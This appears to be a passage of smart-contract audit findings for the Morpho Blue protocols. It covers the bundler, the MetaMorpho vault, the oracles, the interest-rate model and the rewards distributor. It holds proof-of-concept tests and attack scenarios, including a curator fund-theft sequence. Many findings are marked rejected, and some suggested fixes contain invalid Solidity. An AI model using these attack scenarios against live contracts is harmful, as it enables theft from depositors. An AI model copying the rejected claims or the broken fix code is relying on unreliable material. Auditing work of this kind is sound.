- Users can lose assets when repaying loans in the Morpho Blue markets through the MorphoBundler because the unspent assets are not transferred back to the caller


- Proof of Concept
- When users use the MorphoBundler to [supply](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/morpho-blue-bundlers/src/MorphoBundler.sol#L90), [repay](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/morpho-blue-bundlers/src/MorphoBundler.sol#L174), or [liquidate](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/morpho-blue-bundlers/src/MorphoBundler.sol#L244), they can do these operations by specifying either a number of assets or amount of shares that they'd like to supply/repay/liquidate in a Morpho Blue Market. [When the user specifies the number of assets, the number of shares must be 0, otherwise, it will revert in the Morpho Blue market](https://cantina.xyz/ai/d86b7f95-e574-4092-8ea2-78dcac2f54f1/morpho-org-morpho-blue-f463e40/src/Morpho.sol#L175), the same applies vice-versa, when the user specifies the number of shares, the number of assets must be 0.
- The assets that are gonna be pulled from the Morpho Blue market must have already been transferred into the Bundler, the problem is when the users are specifying shares, the amount of assets that will need to be transferred from the bundler is not an exact amount that can be known in advance, so, the users need to transfer X amount of assets into the Bundler, from where the Market will pull Y amount of assets to cover the required amount of assets based on the specified amount of shares. The problem is that the difference between the number of assets that the user deposited into the Bundler and the actual amount of assets that were pulled from the Bundler are not returned to the user at the end of the execution, thus, these assets can be lost and left in the Bundler contract.

> MorphoBundler.sol
```solidity
    function morphoRepay(
        ...
    ) external payable protected {
        ...
        (uint256 repaidAssets, uint256 repaidShares) = MORPHO.repay(marketParams, assets, shares, onBehalf, data);

        if (assets > 0) require(repaidShares >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);
        else require(repaidAssets <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);

        //@audit-issue => If the user specified an amount of shares to operate, the unspent amount of loanTokens is not returned to the initiator!
        //@audit-issue => The unspent tokens could be left on the bundler contract
    }

```

- Tools Used
Manual Audit

- Recommended Mitigation Steps
- The suggested mitigation to prevent this from happening is to at the end of the function execution, call the TransferBundler::erc20Transfer() and pass `type(uint256).max` as the value of the amount to be transferred, in this way, any unspent loanToken in the Bundler contract will be sent back to the caller.
```solidity
    function morphoRepay(
        MarketParams calldata marketParams,
        uint256 assets,
        uint256 shares,
        uint256 slippageAmount,
        address onBehalf,
        bytes calldata data
    ) external payable protected {
       ...

        (uint256 repaidAssets, uint256 repaidShares) = MORPHO.repay(marketParams, assets, shares, onBehalf, data);


        if (assets > 0) require(repaidShares >= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);
-       else require(repaidAssets <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);
+       else {
+         require(repaidAssets <= slippageAmount, ErrorsLib.SLIPPAGE_EXCEEDED);
          //@audit-info => When repaying shares, return any unspent loanToken to the initiator!
+         erc20Transfer(marketParams.loanToken, initiator(), type(uint256).max);
+       }

    }
```



### ERC20PermissionBase does not consider a deflationary token	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

ERC20PermissionBase does not consider deflationary tokens like fee-on-transfer when receiving tokens from users in the depositFor() of ERC20Wrapper. For instance, an amount of wrapped tokens to be minted is equal to the amount of assets to be received through transferFrom(). If it receives a fee-on-transfer token, which deducts a certain fee upon transfer, the actual amount of tokens held by the contract will be less than the totalSupply. Consequently, if all tokens are withdrawn, the protocol could become insolvent, leaving the last withdrawer unable to retrieve their tokens. 


**Recommendation**:

When receiving tokens from users, the contract should account fee-deducted amount by overriding depositFor() of OZ's ERC20Wrapper.




### Incorrect check in HasPermission	_(duplicate of [`_update` will not allow anyone to hold any tokens])_

**Severity:** Medium risk

**Context:** [ERC20PermissionedBase.sol#L52-L52](erc20-permissioned/src/ERC20PermissionedBase.sol#L52-L52)

if account is address(0)

hasPermission return True

!hasPermission return False

so in the function _update,

the revert NoPermission(from) and NoPermission(to) will not be triggered and transfer can happen

if the account address is MORPHOR or BUNDLER, same issue happens,

the revert will not be triggered

as the comment suggests

> Returns true if `account` has no permission.

the protocol should refactor the function

```solidity
   function hasNoPermission(address account) public view virtual returns (bool) {
        return account == address(0) || account == MORPHO || account == BUNDLER;
    }
```

and in the _update function

```solidity
    function _update(address from, address to, uint256 value) internal virtual override {
        if (hasNoPermission(from)) revert NoPermission(from);
        if (hasNoPermission(to)) revert NoPermission(to);

        super._update(from, to, value);
    }
```



### Curator can prevent users from withdrawing during timelock and steal funds from Metamorpho	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Impact
Curator can call `submitCap`, which starts process of adding a new market or adjusts cap of existing one
There is an enforced timelock period which is present to allow Users to withdraw if they don't agree with the new cap being set
This report describes how a Curator can steal funds from Metamorpho, after preventing users from withdrawing during timelock period.

- Proof of Concept 
Curator can create a market on Morpho, with its oracle set to a contract which Curator controls, set the cap for that market on metamorpho, and prevent Metamorpho depositors from withdrawing during timelock, and perform some other steps as outlined below to steal funds fron Metamorpho.

Here is the Attack Scenario:
- Curator creates a market on Morpho via `Morpho#createMarket`, inputting a worthless `collToken` and setting the oracle to a contract he can feed any `price` value to
- Curator borrows large amounts from all underlying markets to prevent suspecting users from withdrawing 
- Curator calls `Metamorpho#submitCap` with marketParams of the market he created, and a `newSupplyCap` of the amount of assets he wants to steal
- Many users will want to withdraw their funds, but the totalBorrows can't be withdrawn

After the timelock period, in a single transaction:
- Curator repays his borrow on all underlying markets
- Curator `acceptCap` on the submitted cap
- Curator calls `Metamorpho#reallocate` to supply all metamorpho funds to the newly created market
- Curator sets the oracle price to make the worthless `collToken` seem very valuable compared to the loanToken.
- Curator borrows all the assets from his malicious market, sending the worthless token as collateral

Now, Curator has stolen all funds from metamorpho by opening a large borrow position backed by worthless collateral.

- Tools Used
Manual Review

- Recommendation
Addition of markets to metamorpho should only be done in constructor where owner can pass a long array of markets metamorpho can ever interact with.



### There is no slippage protection in MetaMorpho#withdraw, which can lead to burning of more shares than user intended	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Impact
Metamorpho#withdraw can be frontrun with a bad debt causing liquidate call within any of the underlying markets to cause more of the withdrawer's shares to be burned

- Proof of Concept
Metamorpho depositors specify the amount of assets they want to withdraw, which will get converted to shares to burn:

```solidity
function withdraw(uint256 assets, address receiver, address owner) public override returns (uint256 shares) {
    uint256 newTotalAssets = _accrueFee();

    shares = _convertToSharesWithTotals(assets, totalSupply(), newTotalAssets, Math.Rounding.Ceil);
    
    _updateLastTotalAssets(newTotalAssets.zeroFloorSub(assets));

    _withdraw(_msgSender(), receiver, owner, assets, shares);
}
```
shares is basically calculated as assets*totalShares/totalAssetsInMarkets

As we know, totalSupplyAssets in a market can be reduced due to bad debt.

If a user calls withdraw, expecting that a particular amount of his shares will get burned, and if before his transaction gets executed, there is a liquidate call that causes bad debt in the underlying market, the totalSupplyAssets get reduced, leading to an increase in the amount of shares that will be burned from the user.

- Tools Used
Manual Review

- Recommendation
Allow users to specify the maximum shares they are willing to burn. If the calculated shares to burn is less than this value, call should revert



### Liquidators can't set slippage for the min amount of seizedAssets that to receive for a liquidation through the MorphoBundler	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Impact
- The liquidators have no means to set a slippage when they are liquidating a specific amount of shares, they can set a slippage for the maximum amount of assets they are willing to repay, but they can't set a slippage for the minimum amount of seizedAssets.

- Proof of Concept
Liquidations made through the MorphoBundler by using the [`morphoLiquidate() function`](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/morpho-blue-bundlers/src/MorphoBundler.sol#L244) might receive less amount of the seizedAssets than what the liquidators expect to receive, and there are no ways to reject the tx if the seizedAssets doesn't meet a minimum amount.
  For example, liquidator might expected to pay 1800USDC in exchange for 1ETH, but, if the price of the collateral (seizedAsset) changes, it could end up receiving fewer seizedAssets than the amount the liquidator is expecting

```solidity
    function morphoLiquidate(
        ...
    ) external payable protected {
        _approveMaxTo(marketParams.loanToken, address(MORPHO));

        (, uint256 repaidAssets) = MORPHO.liquidate(marketParams, borrower, seizedAssets, repaidShares, data);

        //@audit-info => Slippage to prevent repaying more than intended
        require(repaidAssets <= maxRepaidAssets, ErrorsLib.SLIPPAGE_EXCEEDED);

        //@audit-issue => There is no slippage to prevent the liquidators from receiving fewer seizedShares than the minimum amount they expect to receive
    }
```

- Tools Used
Manual Audit

- Recommended Mitigation Steps
Add an extra parameter that will allow the liquidators to specify the minimum amount of seizedShares they expect to receive for the liquidation, and check that the returned seized amount from the Morpho::liquidate() is greater than the minimum amount of seizedShares.
```solidity
    function morphoLiquidate(
        MarketParams calldata marketParams,
        address borrower,
        uint256 seizedAssets,
        uint256 repaidShares,
        uint256 maxRepaidAssets,
+       uint256 minSeizedShares,
        bytes memory data
    ) external payable protected {
        _approveMaxTo(marketParams.loanToken, address(MORPHO));

        //@audit-info => Morpho will pull the loanToken from the bundler
        //@audit-info => The liquidator must have already transferred the loanTokens to repay into the bundler contract

-       (, uint256 repaidAssets) = MORPHO.liquidate(marketParams, borrower, seizedAssets, repaidShares, data);
+       (uint256 receivedShares, uint256 repaidAssets) = MORPHO.liquidate(marketParams, borrower, seizedAssets, repaidShares, data);

        require(repaidAssets <= maxRepaidAssets, ErrorsLib.SLIPPAGE_EXCEEDED);
        //@audit-info => If the liquidator sends the minSeizedshares as type(uint256).max it means that they accept any amount of shares for the liquidation
+       if (minSeizedShares == type(uint256).max) return;
+       else require(receivedShares >= minSeizedShares);
    }
```




### Chainlink feed will return the wrong price for asset if underlying aggregator hits minAnswer	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** [ChainlinkDataFeedLib.sol#L23-L23](morpho-blue-oracles/src/libraries/ChainlinkDataFeedLib.sol#L23-L23)

- Overview

Chainlink aggregators have a built in circuit breaker if the price of an asset goes outside of a predetermined price band. The result is that if an asset experiences a huge drop in value (i.e. LUNA crash) the price of the oracle will continue to return the minPrice instead of the actual price of the asset. This would allow user to continue borrowing with the asset but at the wrong price. This is exactly what happened to [Venus on BSC when LUNA imploded](https://rekt.news/venus-blizz-rekt/).

- Impact

In the event that an asset crashes the protocol can be manipulated to give out loans at an inflated price.

- Proof of Concept

ChainlinkDataFeedLib uses the AggregatorV3Interface to obtain the price of the requested tokens:

```solidity
    function getPrice(AggregatorV3Interface feed) internal view returns (uint256) {
        if (address(feed) == address(0)) return 1;
        (, int256 answer,,,) = feed.latestRoundData();
        require(answer >= 0, ErrorsLib.NEGATIVE_ANSWER);
        return uint256(answer);
    }
```

ChainlinkAggregators have minPrice and maxPrice circuit breakers built into them. This means that if the price of the asset drops below the minPrice, the protocol will continue to value the token at minPrice instead of it's actual value. This will allow users to take out huge amounts of bad debt and bankrupt the protocol.

- Simple Example:

- TokenA has a minPrice of €120.
- The price of TokenA drops to €12.
- The aggregator still returns €120 allowing the user to borrow against TokenA as if it is €120 which is 10x it's actual value.

- Tools Used

Manual review

- Recommended Mitigation Steps

ChainlinkDataFeedLib should check the returned answer against the minPrice/maxPrice and revert if the answer is outside of the bounds:

```solidity
    function getPrice(AggregatorV3Interface feed) internal view returns (uint256) {
        if (address(feed) == address(0)) return 1;
        (, int256 answer,,,) = feed.latestRoundData();
        require(answer >= 0, ErrorsLib.NEGATIVE_ANSWER);
        if (answer >= maxPrice or answer <= minPrice) revert();
        return uint256(answer);
    }
```

You can find Chainlink’s oracle feed [minAnswer, maxAnswer] values by reading the minAnswer & maxAnswer values from the aggregator contract.



### There is no slippage protection in MetaMorpho#redeem, which can lead to user receiving less assets than expected	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_


- Impact
Metamorpho#redeem can be frontrun with a liquidate call within any of the underlying markets to cause less assets to be sent to the user.

- Proof of Concept
Metamorpho depositors specify the amount of shares they want to redeem, which will get converted to assets to send:

```solidity
function redeem(uint256 shares, address receiver, address owner) public override returns (uint256 assets) {
    uint256 newTotalAssets = _accrueFee();

    assets = _convertToAssetsWithTotals(shares, totalSupply(), newTotalAssets, Math.Rounding.Floor);

    _updateLastTotalAssets(newTotalAssets.zeroFloorSub(assets));

    _withdraw(_msgSender(), receiver, owner, assets, shares);
}
```

As we know, totalSupplyAssets in a market can be reduced due to bad debt.

If a user calls redeem, expecting to receive a particular amount of `assets`, and if before his transaction gets executed, there is a liquidate call that causes bad debt in the underlying market, the totalSupplyAssets get reduced, leading to a reduction in the amount of `assets` the user receives

- Tools Used
Manual Review

- Recommendation
Allow users to specify the minimum assets they are expecting to receive. If the calculated assets is less than this value, call should revert



### `submitMarketRemoval` and `updateWithdrawQueue` can be used as a means to steal funds from depositors	_(duplicate of [Removing Market From `withdrawQueue` Could Result In Regular User Losses])_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_


- Links 
https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L614
https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L351-L382

- Impact
`submitMarketRemoval` and `updateWithdrawQueue` does not check if totalSupplyShares of Metamorpho within the market being removed is non zero, which makes depositors lose some of their funds if they are withdrawn.
Given that such market can be added later on, curator can use this as a means to steal funds from users.
So funds are not actually "lost" as was stated in the natspec of the submitMarketRemoval function: "Submits a forced market removal from the vault, eventually losing all funds supplied to the market.", but unlucky depositors that withdraw lose permanently
In addition, suspecting users can be blocked from withdrawing their funds by borrowing large from underlying markets so that [this check](https://github.com/morpho-org/morpho-blue/blob/main/src/Morpho.sol#L220) within Morpho#withdraw causes a revert.

- Proof of Concept
Once a market gets removed by curator via submitMarketRemoval, allocator can `updateWithdrawQueue` to [remove](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L351-L382) that market from the withdraw queue.

totalAssets() will [reduce](https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L614) because market has been removed from withdrawQueue

So next withdrawers will withdraw less because `_convertToSharesWithTotal` and `_convertToAssetsWithTotal` use totalAssets() in calculation:
`shares*totalAssets/totalShares`

So consider this scenario:
- Curator submitMarketRemoval which enforces timelock
    - Users will want to withdraw, but as long as there are borrowedAssets in the underlying markets, many users can't withdraw
- Allocator updateWithdrawQueue, removing the removed market from the withdraw queue
- totalAssets becomes smaller because a market which contained assets has been removed frow withdrawQueue.
- Anyone that withdraws during this period claims less tokens than they should have

Now, if the Market gets added later on, withdrawers will be able to withdraw more than they should, while those that have already withdrawn permanently lost their funds

- Tools Used
Manual Review

- Recommendation
- submitMarketRemoval should try to reallocate, withdrawing all assets from the market being removed
- Curator should not be allowed to submitMarketRemoval when the totalSupplyShares of Metamorpho in that market is non-zero





### Protocol Faces Limited Functionality Due to Chainlink Oracle Access Disruption	_(duplicate of [Unhandled revert could lock price oracle access])_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

- Severity
**Medium**

- Relevant GitHub Links
https://github.com/morpho-org/morpho-blue-oracles/blob/ac9b8bac0da4ad56830e6168dbf605bd64be300b/src/libraries/ChainlinkDataFeedLib.sol#L20-L26

- Summary
The ChainlinkDataFeedLib library, utilized by Morpho, exposes functions to interact with Chainlink-compliant price feeds. The `getPrice` function fetches the latest price from a Chainlink feed, and the `getDecimals` function retrieves the number of decimals of the feed. However, the library lacks proper handling for potential Chainlink oracle malfunctions or denials of access.

- Vulnerability Details
The `getPrice` function, crucially used in the `liquidate` and `_isHealthy` functions of Morpho, fetches the latest price from the configured Chainlink oracle. The absence of proper error handling in the face of Chainlink oracle malfunctions or denials of access poses a significant risk. If the oracle feed malfunctions or is inaccessible, the entire `liquidate` and `_isHealthy` functions will revert, potentially causing severe disruptions.

- Impact
The vulnerability has a medium impact, as it can lead to the permanent bricking of the Morpho smart contract if the configured Chainlink oracle feed malfunctions or ceases operating. This situation could result in the inability to perform critical functions such as liquidation and health checks, jeopardizing the overall functionality of the protocol.

- POC

- The `liquidate` function is a critical function called by a liquidator in the protocol.

- Within this function, the collateral price is determined using the line `uint256 collateralPrice = IOracle(marketParams.oracle).price();`.

- If Chainlink is experiencing a malfunction or is temporarily down, the above line will revert. As a result, the `liquidate` function will fail, preventing the liquidation process.

- Similarly, the `_isHealthy` function, which checks the health of a position, relies on the accurate calculation of `collateralPrice`. If Chainlink is malfunctioning or inaccessible, calling this function may also result in a revert or incorrect calculation.

- This poses a significant issue for users who wish to liquidate their positions or perform any action dependent on the accurate determination of `collateralPrice`. The unavailability of Chainlink could disrupt the entire liquidation process and hinder the normal functioning of the protocol.

- Tools used
- Manual review

- Recommendations
 **Implement Try/Catch Blocks:**
   Wrap calls to Chainlink oracles in try/catch blocks to gracefully handle any errors that may occur during the execution of functions relying on Chainlink price feeds.




### Absence of timelock in SetFee function	_(duplicate of [`setFee` is not time-locked])_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

From protocol document, the protocol's governance principles mandate the use of timelocks for actions potentially adverse to users' interests. This includes significant operations like enabling a market with high exposure or increasing fees. The guideline stipulates a minimum 12-hour timelock for such actions. During this period, a guardian role can revoke any action except for fee increases. Once the timelock expires, the action becomes executable by anyone.

                All actions that may be against users' interests (e.g. enabling a market with a high exposure, increasing the fee) are subject to a timelock of minimum 12 hours. If set, the `guardian` can revoke the action during the timelock except for the fee increase. After the timelock, the action can be executed by anyone.

Regarding the owner's capabilities, it is specified that setting the performance fee (with a maximum limit of 50%) should be subject to a timelock, without a possibility for veto. 

                - [Timelocked with no possible veto] Set the performance fee (capped to 50%).

The function lacks the necessary timelock mechanism, contradicting the stated governance principles. This oversight presents a significant governance risk, as it allows for immediate changes to a crucial variable impacting users without the safeguard of a timelock.

```javascript
File: metamorpho/src/MetaMorpho.sol
233:     function setFee(uint256 newFee) external onlyOwner {
234:         if (newFee == fee) revert ErrorsLib.AlreadySet();
235:         if (newFee > ConstantsLib.MAX_FEE) revert ErrorsLib.MaxFeeExceeded();
236:         if (newFee != 0 && feeRecipient == address(0)) revert ErrorsLib.ZeroFeeRecipient();
237: 
238:         // Accrue interest using the previous fee set before changing it.
239:         _updateLastTotalAssets(_accrueFee());
240: 
241:         // Safe "unchecked" cast because newFee <= MAX_FEE.
242:         fee = uint96(newFee);
243: 
244:         emit EventsLib.SetFee(_msgSender(), fee);
245:     }
```

**Recommendation**:

To align with the protocol's governance principles and enhance security, it is crucial to implement a timelock mechanism for the setFee function. This modification should ensure that any change to the fee structure undergoes a mandatory waiting period of at least 12 hours.



### Donation is also accounted in calculating protocol fee 	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

In the current implementation, the protocol fee is computed based on the difference between `newTotalAssets` and `lastTotalAssets`, multiplied by the fee percentage. However, this method mistakenly includes donations to the vault in the fee calculation, which is not intended. The fee should be applied solely on the increase in assets due to interest, not on any additional contributions like donations.

        function _accruedFeeShares() internal view returns (uint256 feeShares, uint256 newTotalAssets) {
            newTotalAssets = totalAssets();

            uint256 totalInterest = newTotalAssets.zeroFloorSub(lastTotalAssets);
            if (totalInterest != 0 && fee != 0) {
                uint256 feeAssets = totalInterest.mulDiv(fee, WAD);
                // The fee assets is subtracted from the total assets in this calculation to compensate for the fact
                // that total assets is already increased by the total interest (including the fee assets).
                feeShares =
                    _convertToSharesWithTotals(feeAssets, totalSupply(), newTotalAssets - feeAssets, Math.Rounding.Floor);
            }
        }

https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/metamorpho/src/MetaMorpho.sol#L914-L925

This miscalculation results in an unwarranted fee being applied to donations, leading to an unjustified reduction in the asset value per share for users, effectively diminishing their rightful profits.

POC:

A test case (DonationChargeFee.t.sol) demonstrates this issue. When a donation is made to the vault, it erroneously increases the fee shares due to the inclusion of the donation amount in the newTotalAssets calculation. The test scenario simulates this situation, showing how the current logic leads to an inflated fee calculation, thereby impacting the asset value per share for users.

Create a test file `DonationChargeFee.t.sol` in `metamorpho/test/forge/DonationChargeFee.t.sol` as below.
Run `cd metamorpho && forge test -vvvvv --match-path test/forge/DonationChargeFee.t.sol --match-test testVaultDonation`


```javascript
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import "../../lib/forge-std/src/Test.sol";
import "../../lib/forge-std/src/console2.sol";
import {Id, MarketParams, Market, IMorpho} from "../../lib/morpho-blue/src/interfaces/IMorpho.sol";
import "../../src/interfaces/IMetaMorpho.sol";
import {MetaMorpho, ERC20, IERC20, MarketAllocation} from "../../src/MetaMorpho.sol";
import {IrmMock} from "../../src/mocks/IrmMock.sol";
import {ERC20Mock} from "../../src/mocks/ERC20Mock.sol";
import {OracleMock} from "../../src/mocks/OracleMock.sol";

import {MarketParamsLib} from "../../lib/morpho-blue/src/libraries/MarketParamsLib.sol";

contract POC is Test {
    using MarketParamsLib for MarketParams;

    event AccrueInterest(uint256 newTotalAssets, uint256 feeShares);

    uint256 constant TIMELOCK = 1 weeks;

    address internal OWNER = makeAddr("Owner");
    address internal MORPHO_OWNER = makeAddr("MorphoOwner");
    address internal SUPPLIER = makeAddr("Supplier");
    address internal ALLOCATOR = makeAddr("Allocator");
    address internal FEE_RECIPIENT = makeAddr("FeeRecipient");
    address internal BORROWER = makeAddr("Borrower");

    MarketParams marketParams1;
    MarketParams marketParams2;
    MarketParams[] internal allMarkets;

    IMorpho internal morpho = IMorpho(deployCode("lib/morpho-blue/out/Morpho.sol/Morpho.json", abi.encode(MORPHO_OWNER)));
    ERC20Mock internal loanToken = new ERC20Mock("loan", "B");
    ERC20Mock internal collateralToken = new ERC20Mock("collateral", "C");
    OracleMock internal oracle = new OracleMock();
    IrmMock internal irm = new IrmMock();
    // vm.label(address(loanToken), "Loan");

    IMetaMorpho internal vault;

    function setUp() public {
        vault = IMetaMorpho(
            address(new MetaMorpho(OWNER, address(morpho), TIMELOCK, address(loanToken), "MetaMorpho Vault", "MMV"))
        );

        vm.startPrank(OWNER);
        vault.setIsAllocator(ALLOCATOR, true);
        vault.setFeeRecipient(FEE_RECIPIENT);
        vault.setFee(0.5e18);
        vm.stopPrank();

        marketParams1 = MarketParams({
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            oracle: address(oracle),
            irm: address(irm),
            lltv: 0.8 ether
        });

        marketParams2 = MarketParams({
            loanToken: address(loanToken),
            collateralToken: address(collateralToken),
            oracle: address(oracle),
            irm: address(irm),
            lltv: 0.5 ether
        });

        allMarkets.push(marketParams1);
        allMarkets.push(marketParams2);

        vm.startPrank(MORPHO_OWNER);
        morpho.enableIrm(address(irm));

        morpho.enableLltv(0.8 ether);
        morpho.enableLltv(0.5 ether);
        vm.stopPrank();

        morpho.createMarket(marketParams1);
        morpho.createMarket(marketParams2);

        oracle.setPrice(1e36);
        irm.setApr(0.5 ether);
    }

    function testVaultDonation() public {
        // Increase cap
        vm.startPrank(OWNER);
        vault.submitCap(marketParams1, 0.5e18);
        vault.submitCap(marketParams2, 2e18);
        vm.warp(block.timestamp + 1 weeks);
        vault.acceptCap(allMarkets[0].id());
        vault.acceptCap(allMarkets[1].id());
        vm.stopPrank();

        // Supplier deposit
        loanToken.setBalance(SUPPLIER, 10e18);
        vm.startPrank(SUPPLIER);
        loanToken.approve(address(vault), type(uint256).max);
        vault.deposit(1, SUPPLIER);

        // Donate:
        loanToken.approve(address(morpho), type(uint256).max);
        morpho.supply(marketParams2, 1e18, 0, address(vault), hex"");

        vm.expectEmit();
        emit AccrueInterest(1000000000000000001, 1999999); // 1.999e6 of fee shares are created from the 1e18 donation.
        vault.deposit(0, OWNER); // Call to accrue
        vm.stopPrank();
    }
}

```

**Recommendation**:

Implement that only charge fee on the interest from borrowing instead of all increase in the market.



### Inconsistencies in borrow bate formula for low target utilization rates	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** _(No context files were provided by the reviewer)_

**Description**:

In the `AdaptiveCurveIrm` contract, the `_borrowRate` function calculates the borrow rate based on the normalized utilization rate and elapsed time. 

        function _borrowRate(Id id, Market memory market) private view returns (uint256, int256) {
            // Safe "unchecked" cast because the utilization is smaller than 1 (scaled by WAD).
            int256 utilization =
                int256(market.totalSupplyAssets > 0 ? market.totalBorrowAssets.wDivDown(market.totalSupplyAssets) : 0);

            int256 errNormFactor = utilization > TARGET_UTILIZATION ? WAD - TARGET_UTILIZATION : TARGET_UTILIZATION;
            int256 err = (utilization - TARGET_UTILIZATION).wDivDown(errNormFactor);

            ...
        }
https://cantina.xyz/ai/8409a0ce-6c21-4cc9-8ef2-bd77ce7425af/morpho-blue-irm/src/AdaptiveCurveIrm.sol#L122

An important aspect of this calculation is the normalization factor (`errNormFactor`), which adjusts the difference (`err`) between the actual `utilization` and the target utilization (`TARGET_UTILIZATION`).

In normal setting when the `TARGET_UTILIZATION` = 0.9e18 or 90%, if the utilization is over 90%, the errNormFactor decreased to WAD - TARGET_UTILIZATION = 0.1e18, which will amplify the err, the borrow rate will increase at a higher rate. If the utilization is less than 90%, the errNormFactor increased to `TARGET_UTILIZATION` = 0.9e18, which will decrease the err, the borrow rate will increase at a lower rate. The current formula behaves as expected: increasing the borrow rate more rapidly when utilization exceeds the target and less rapidly when below it. This is logical as it aims to balance the market by discouraging borrowing when utilization is high and vice versa.


However, in the case when `TARGET_UTILIZATION` is less than 50%, the reversal effect happens. For example, with TARGET_UTILIZATION at 40% or 0.4e18, the errNormFactor = 0.6e18 when utilization > 40%, and errNormFactor = 0.4e18 when utilization <= 40%. It means that the err will increase faster when utilization below target and increase slower when utilization above target. It is not the intended effect.

The formula will not behave in a way that incentivize users to put the market in a state where target utilization is met when TARGET_UTILIZATION < 50%.

**Recommendation**:

To correct this issue, the formula should be updated to account for scenarios where TARGET_UTILIZATION is less than 50%. The revised formula should ensure that the borrow rate increases more rapidly when the utilization is above the target and less rapidly when below, regardless of the target utilization rate.

```diff
        int256 utilization =
                int256(market.totalSupplyAssets > 0 ? market.totalBorrowAssets.wDivDown(market.totalSupplyAssets) : 0);
-       int256 errNormFactor = utilization > TARGET_UTILIZATION ? WAD - TARGET_UTILIZATION : TARGET_UTILIZATION;
+       if (TARGET_UTILIZATION >= 0.5 ether) {
+            int256 errNormFactor = utilization > TARGET_UTILIZATION ? WAD - TARGET_UTILIZATION : TARGET_UTILIZATION;
+       } else {
+            int256 errNormFactor = utilization > TARGET_UTILIZATION ? TARGET_UTILIZATION : WAD - TARGET_UTILIZATION ;
+       }
```



### Possible loss of ownership	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** [UniversalRewardsDistributor.sol#L193-L197](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L193-L197)

No checks for 0 address can cause loss of ownership



### Issue on `claim` mechanism can lead to incomplete or failed claims	_(this issue has been rejected)_

**Severity:** Medium risk

**Context:** [UniversalRewardsDistributor.sol#L115-L136](universal-rewards-distributor/src/UniversalRewardsDistributor.sol#L115-L136)

**Description**: The `claim` function cant handle multiple claims for the same user and reward token. Specifically, the contract uses a `claimed` mapping to track the already claimed amount for each `(account, reward)` pair. When a user tries to claim rewards, the contract computes the new claimable amount as `claimable - claimed[account][reward]`. However, this approach does not account for scenarios where a user has multiple distinct claims for the same reward token in the Merkle tree.

For example, if a user has two separate claims for 1.2 and 1 ether of the same token, the outcome depends on the order of claims. If the user first claims 1.2 ether, any subsequent attempt to claim 1 ether will fail due to the `ErrorsLib.CLAIMABLE_TOO_LOW` error, as the claimed amount (1.2 ether) will be greater than the new claimable amount (1 ether). Conversely, if the user claims 1 ether first, then claims 1.2 ether, they will end up with only 1.2 ether in total instead of the expected 2.2 ether.

This issue is exacerbated by the fact that claims can be made by anyone on behalf of any account, increasing the risk of unpredictable or unfair claim outcomes.

Here is a POC;
```solidity
function testClaimPoc() public {
    address user = makeAddr("user");
    
    bytes32[] memory data = new bytes32[](2);

    data[0] = keccak256(
        bytes.concat(keccak256(abi.encode(user, address(token1), 1.2 ether)))
    );
    data[1] = keccak256(
        bytes.concat(keccak256(abi.encode(user, address(token1), 1 ether)))
    );

    bytes32 root = merkle.getRoot(data);

    vm.prank(owner);
    distributionWithoutTimeLock.setRoot(root, DEFAULT_IPFS_HASH);

    assertEq(distributionWithoutTimeLock.root(), root);

    
    bytes32[] memory proof1 = merkle.getProof(data, 0);

    distributionWithoutTimeLock.claim(user, address(token1), 1.2 ether, proof1);

    bytes32[] memory proof2 = merkle.getProof(data, 1);

    distributionWithoutTimeLock.claim(user, address(token1), 1 ether, proof2);        

    assertEq(token1.balanceOf(user), 2.2 ether);
}

```

**Recommendation**: To resolve this issue, it is recommended to adjust the way the contract calculates and stores the claimed amounts. The contract should increment the claimed[account][reward] by the amount actually transferred during each claim, rather than setting it to the total claimable amount. This change ensures that each claim is independent and additive, allowing users to claim the full amount they are entitled to, regardless of the number or order of claims.

Additionally, the contract should ensure that the claimable amount for each claim is properly verified against the Merkle proof, that the proof corresponds to the exact claim being made and the signature used in the Merkle proof `(keccak256(bytes.concat(keccak256(abi.encode(account, reward, claimable))))` havent been use previously.

Please review this as an example of the recommendation
```diff
diff --git a/src/UniversalRewardsDistributor.sol b/src/UniversalRewardsDistributor.sol
index f29c2ae..e168f84 100644
--- a/src/UniversalRewardsDistributor.sol
+++ b/src/UniversalRewardsDistributor.sol
@@ -105,6 +105,8 @@ contract UniversalRewardsDistributor is IUniversalRewardsDistributorStaticTyping
         emit EventsLib.PendingRootRevoked(msg.sender);
     }
 
+    mapping(bytes32 hash => bool) public claimedHash;
+
     /// @notice Claims rewards.
     /// @param account The address to claim rewards for.
